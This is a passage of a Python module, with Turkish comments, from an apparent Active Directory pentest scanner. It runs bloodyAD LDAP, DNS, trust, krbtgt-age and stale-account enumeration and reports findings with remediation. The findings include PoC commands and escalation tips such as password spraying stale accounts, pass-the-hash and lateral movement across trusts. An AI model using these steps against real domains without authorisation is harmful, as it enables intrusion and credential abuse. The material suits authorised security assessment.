        "(hash ile: -hashes :<nt>)  ->  elde edilen ccache'i KRB5CCNAME'e koy -> hedef servise eriş."),
]


def scan_enum(
    target: str,
    *,
    domain: str | None = None,
    username: str | None = None,
    password: str | None = None,
    nthash: str | None = None,
    timeout: int = 300,
    dry_run: bool = False,
    use_kerberos: bool = False,
) -> list[CommandResult]:
    """Kimlikle LDAP enumerasyonu: her _ENUM_QUERIES sorgusu + dnsDump + trusts.

    `--json` ile güvenilir ayrıştırma; ilk sorguda signing/CB hatası görülürse
    kalan TÜM sorgular LDAPS (`-s`) ile tekrarlanır.
    """
    if username is None or not (password or nthash):
        return [CommandResult(
            tool="bloodyad-enum:skip", argv=[], returncode=None, stdout="", stderr="",
            duration=0.0, error="bloodyAD enum: kimlik gerekli (LDAP bind auth ister)")]

    def argv(secure: bool) -> list[str]:
        return _base_argv(target, domain, username, password, nthash,
                          json_out=True, secure=secure, use_kerberos=use_kerberos)

    results: list[CommandResult] = []
    secure = False
    for i, q in enumerate(_ENUM_QUERIES):
        sub = ["get", "search", "--filter", q.ldap_filter, "--attr", q.attrs]
        res = run(argv(secure) + sub, tool=f"bloodyad-enum-{q.key}",
                  timeout=timeout, dry_run=dry_run)
        # İlk sorguda DC signing/CB zorunluysa LDAPS'e geç (ve kalan sorgularda da kullan)
        if i == 0 and not dry_run and _needs_secure(res):
            secure = True
            res = run(argv(True) + sub, tool=f"bloodyad-enum-{q.key}",
                      timeout=timeout, dry_run=dry_run)
        results.append(res)
    results.append(run(argv(secure) + ["get", "dnsDump"],
                       tool="bloodyad-enum-dns", timeout=timeout, dry_run=dry_run))
    results.append(run(argv(secure) + ["get", "trusts"],
                       tool="bloodyad-enum-trusts", timeout=timeout, dry_run=dry_run))
    # krbtgt parola yaşı (golden-ticket ömrü + geçmiş ele geçirme izi)
    results.append(run(
        argv(secure) + ["get", "search", "--filter", "(sAMAccountName=krbtgt)",
                        "--attr", "sAMAccountName,pwdLastSet"],
        tool="bloodyad-enum-krbtgt", timeout=timeout, dry_run=dry_run))
    # Bayat ama ETKİN hesaplar: STALE_ACCOUNT_DAYS gündür oturum açmamış, devre dışı değil
    ft = _filetime_threshold(STALE_ACCOUNT_DAYS)
    stale_filter = (f"(&(sAMAccountType=805306368)"
                    f"(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
                    f"(lastLogonTimestamp>=1)(lastLogonTimestamp<={ft}))")
    results.append(run(
        argv(secure) + ["get", "search", "--filter", stale_filter,
                        "--attr", "sAMAccountName,lastLogonTimestamp"],
        tool="bloodyad-enum-stale", timeout=timeout, dry_run=dry_run))
    return results


# Her domainde her zaman bulunan yerleşik hesap açıklamaları (sır içermez = gürültü)
_BUILTIN_DESC = {
    "built-in account for administering the computer/domain",
    "built-in account for guest access to the computer/domain",
    "key distribution center service account",
}


def _is_builtin_desc(rec: dict[str, list[str]]) -> bool:
    descs = rec.get("description", [])
    return bool(descs) and all(d.strip().lower() in _BUILTIN_DESC for d in descs)


def _records(text: str) -> list[dict[str, list[str]]]:
    """bloodyAD çıktısını boş satırla ayrılmış nesne bloklarına böler.

    Her blok 'key: value' satırlarından oluşur; çok değerli öznitelikler aynı
    anahtarla tekrar eder. Anahtarlar küçük harfe indirgenir.
    """
    recs: list[dict[str, list[str]]] = []
    cur: dict[str, list[str]] = {}
    for line in text.splitlines():
        if not line.strip():
            if cur:
                recs.append(cur)
                cur = {}
            continue
        m = re.match(r"^([A-Za-z0-9\-]+):\s?(.*)$", line)
        if not m:
            continue
        cur.setdefault(m.group(1).lower(), []).append(m.group(2))
    if cur:
        recs.append(cur)
    return recs


def _format_records(recs: list[dict[str, list[str]]], limit: int = 20) -> str:
    """Kayıtları okunur kanıt satırlarına çevirir (JSON/düz-metin fark etmez).

    Her satır: '<sAMAccountName>  attr=deger; attr2=deger2'. DN ikincildir.
    """
    lines: list[str] = []
    for r in recs[:limit]:
        name = (r.get("samaccountname") or r.get("name") or r.get("cn") or [""])[0]
        extras = []
        for k, vals in r.items():
            if k in ("samaccountname", "distinguishedname"):
                continue
            extras.append(f"{k}={','.join(vals)}")
        head = name or (r.get("distinguishedname") or [""])[0]
        line = head + ("  " + "; ".join(extras) if extras else "")
        lines.append(line.strip())
    if len(recs) > limit:
        lines.append(f"… (+{len(recs) - limit} kayıt daha)")
    return "\n".join(lines)


def parse_enum(results: list[CommandResult], report: ScanReport) -> None:
    report.raw_outputs["bloodyad-enum"] = "\n\n".join(r.combined for r in results)
    by_tool = {r.tool: r for r in results}

    first = results[0] if results else None
    if first and first.tool == "bloodyad-enum:skip":
        return  # kimlik yok — sessizce atla

    real = [r for r in results if not r.tool.endswith(":skip")]
    if real and all(not r.ok for r in real):
        err = next((r.error for r in real if r.error), "çalıştırılamadı")
        report.add_error(f"bloodyAD enum: {err}")
        return

    target = report.target
    for q in _ENUM_QUERIES:
        res = by_tool.get(f"bloodyad-enum-{q.key}")
        if res is None or not res.ok:
            continue
        recs = _records_of(res)  # JSON öncelikli; yoksa düz-metin
        if q.key == "desc":
            recs = [r for r in recs if not _is_builtin_desc(r)]  # yerleşik hesap gürültüsünü ele
        if not recs:
            continue
        names = [v for r in recs for v in r.get("samaccountname", [])]
        preview = ", ".join(names[:5]) + ("…" if len(names) > 5 else "") if names else ""
        report.add(Finding(
            title=f"bloodyAD enum: {q.label} — {len(recs)} kayıt"
                  + (f" ({preview})" if preview else ""),
            severity=q.severity, target=target, source="bloodyad-enum",
            description=q.description,
            evidence=_format_records(recs),
            remediation=q.remediation,
            reference="bloodyAD get search (LDAP enum)",
            poc=f"bloodyAD -H {target} -d <domain> -u <user> -p <pass> "
                f"get search --filter '{q.ldap_filter}' --attr {q.attrs}",
            escalation=q.escalation))

    _parse_dns(by_tool.get("bloodyad-enum-dns"), report)
    _parse_trusts(by_tool.get("bloodyad-enum-trusts"), report)
    _parse_krbtgt_age(by_tool.get("bloodyad-enum-krbtgt"), report)
    _parse_stale_accounts(by_tool.get("bloodyad-enum-stale"), report)


def _parse_krbtgt_age(res: CommandResult | None, report: ScanReport) -> None:
    """krbtgt parolası KRBTGT_MAX_AGE_DAYS günden eskiyse uyarır (golden-ticket ömrü)."""
    if res is None or not res.ok:
        return
    recs = _records_of(res)
    for r in recs:
        val = (r.get("pwdlastset") or [""])[0]
        age = _age_days(val)
        if age is None or age < KRBTGT_MAX_AGE_DAYS:
            continue
        report.add(Finding(
            title=f"krbtgt parolası çok eski (~{int(age)} gün) — golden ticket riski",
            severity=Severity.MEDIUM, target=report.target, source="bloodyad-enum",
            description="krbtgt hesabının parolası uzun süredir değişmemiş. Geçmişte bir "
                        "krbtgt hash sızıntısı olduysa hâlâ geçerli golden ticket üretilebilir; "
                        "uzun ömür, eski bir ele geçirmenin kalıcılığını sürdürür.",
            evidence=f"krbtgt pwdLastSet: {val}  (~{int(age)} gün önce)",
            remediation="krbtgt parolasını (olay müdahalesinde İKİ KEZ) döndürün; düzenli "
                        "krbtgt rotasyonunu planlayın.",
            reference="krbtgt / Golden Ticket longevity", mitre="T1558.001",
            poc="bloodyAD ... get object krbtgt --attr pwdLastSet",
            escalation="krbtgt hash'i (DCSync) elde edilmişse golden ticket süresizdir -> "
                       "iki kez sıfırlama gerekir."))
        return  # tek krbtgt yeter


def _parse_stale_accounts(res: CommandResult | None, report: ScanReport) -> None:
    """Uzun süredir oturum açmamış ama ETKİN hesaplar (saldırı yüzeyi / spray hedefi).

    FP guard: filtre FILETIME eşiği + burada her kaydın yaşı yeniden doğrulanır;
    STALE_ACCOUNT_DAYS altındakiler (yanlış eşik vb.) elenir.
    """
    if res is None or not res.ok:
        return
    stale: list[str] = []
    for r in _records_of(res):
        name = (r.get("samaccountname") or [""])[0].strip()
        if not name or name.lower() == "krbtgt":
            continue
        age = _age_days((r.get("lastlogontimestamp") or [""])[0])
        if age is not None and age < STALE_ACCOUNT_DAYS:
            continue  # aslında yeni -> ele (eşik/parse güvencesi)
        stale.append(f"{name}" + (f"  (~{int(age)} gün)" if age is not None else ""))
    if not stale:
        return
    preview = ", ".join(s.split("  ")[0] for s in stale[:5]) + ("…" if len(stale) > 5 else "")
    report.add(Finding(
        title=f"Bayat ama etkin hesap(lar) ({len(stale)}) — nxc/bloodyAD ({preview})",
        severity=Severity.LOW, target=report.target, source="bloodyad-enum",
        description=f"{STALE_ACCOUNT_DAYS}+ gündür oturum açmamış ama hâlâ ETKİN hesaplar. "
                    "Unutulmuş/terk edilmiş hesaplar zayıf parolalı olma eğilimindedir ve "
                    "fark edilmeden spray/ele geçirme için caziptir.",
        evidence="\n".join(stale[:40]),
        remediation="Kullanılmayan hesapları devre dışı bırakın/kaldırın; yaşam döngüsü "
                    "(leaver) sürecini uygulayın.",
        reference="Stale/Inactive Accounts", mitre="T1078",
        poc="bloodyAD ... get search --filter "
            "'(&(sAMAccountType=805306368)(lastLogonTimestamp<=<filetime>))'",
        escalation="Bu hesapları spray'de öncelikli hedef yap (eski/zayıf parola olasılığı yüksek)."))


def _parse_dns(res: CommandResult | None, report: ScanReport) -> None:
    if res is None or not res.ok:
        return
    recs = _records_of(res)  # JSON: {recordName, A:[...], AAAA:[...]} | düz-metin fallback
    names = [v for r in recs for v in r.get("recordname", [])]
    ips = [v for r in recs for v in (r.get("a", []) + r.get("aaaa", []))]
    if not names and not ips:
        return
    ev_lines = []
    for r in recs[:30]:
        nm = (r.get("recordname") or [""])[0]
        addrs = r.get("a", []) + r.get("aaaa", [])
        ev_lines.append(f"{nm}  {', '.join(addrs)}".strip() if nm else ", ".join(addrs))
    report.add(Finding(
        title=f"bloodyAD enum: DNS kayıtları — {len(names) or len(ips)} ad",
        severity=Severity.INFO, target=report.target, source="bloodyad-enum",
        description="AD-entegre DNS bölgesinden okunan kayıtlar; iç ana bilgisayar adlarını "
                    "ve IP'leri verir (hedef haritalama / yanal hareket).",
        evidence="\n".join(ev_lines),
        remediation="Gereksiz DNS okuma yetkilerini kısıtlayın.",
        reference="bloodyAD get dnsDump",
        poc=f"bloodyAD -H {report.target} -d <domain> -u <user> -p <pass> get dnsDump",
        escalation="Keşfedilen host'ları reuse/spray hedefi yap; SPN/servisleri eşle."))


def _parse_trusts(res: CommandResult | None, report: ScanReport) -> None:
    if res is None or not res.ok:
        return
    text = strip_dryrun(res.combined)
    low = text.lower()
    if "no trusts found" in low or "no object found" in low:
        return  # trust yok
    # bloodyAD durum/hata satırlarını ( [-] [!] [*] [+] ) ve kök domaini ele
    lines = [ln for ln in text.splitlines()
             if ln.strip() and not re.match(r"^\s*\[[-+!*]\]", ln)]
    if len(lines) <= 1:
        return  # yalnızca kök domain — gerçek trust yok
    report.add(Finding(
        title="bloodyAD enum: domain trust ilişkisi bulundu",
        severity=Severity.MEDIUM, target=report.target, source="bloodyad-enum",
        description="Etki alanı güven ilişkileri; güvenen/güvenilen domainler üzerinden "
                    "yanal hareket veya SID history istismarı mümkün olabilir.",
        evidence="\n".join(lines[:20]),
        remediation="Gereksiz/eski trust'ları kaldırın; SID filtering uygulayın.",
        reference="bloodyAD get trusts",
        poc=f"bloodyAD -H {report.target} -d <domain> -u <user> -p <pass> get trusts",
        escalation="Cross-domain: güvenilen domainde kimlik -> hedef domaine kimlik doğrula."))


# ---------------------------------------------------------------------------
# Registry adaptörü + kaydı
# ---------------------------------------------------------------------------

from ..registry import ScanContext, ScanModule  # noqa: E402


def _run(ctx: ScanContext) -> list[CommandResult]:
    return scan(ctx.target, domain=ctx.domain, username=ctx.username,
                password=ctx.password, nthash=ctx.nthash,
                timeout=ctx.timeout, dry_run=ctx.dry_run,
                use_kerberos=ctx.use_kerberos)


MODULE = ScanModule(
    name="bloodyad",
    label="bloodyAD yazılabilir nesne / ACL privesc taraması (opt-in, kimlik gerektirir)",
    run=_run,
    parse=parse,
    requires_creds=True,
    optin=True,
)


def _run_enum(ctx: ScanContext) -> list[CommandResult]:
    return scan_enum(ctx.target, domain=ctx.domain, username=ctx.username,
                     password=ctx.password, nthash=ctx.nthash,
                     timeout=ctx.timeout, dry_run=ctx.dry_run,
                     use_kerberos=ctx.use_kerberos)


ENUM_MODULE = ScanModule(
    name="bloodyad-enum",
    label="bloodyAD LDAP enumerasyon — AS-REP/Kerberoast/delegasyon/desc/DNS/trust "
          "(opt-in, kimlik gerektirir)",
    run=_run_enum,
    parse=parse_enum,
    requires_creds=True,
    optin=True,
)
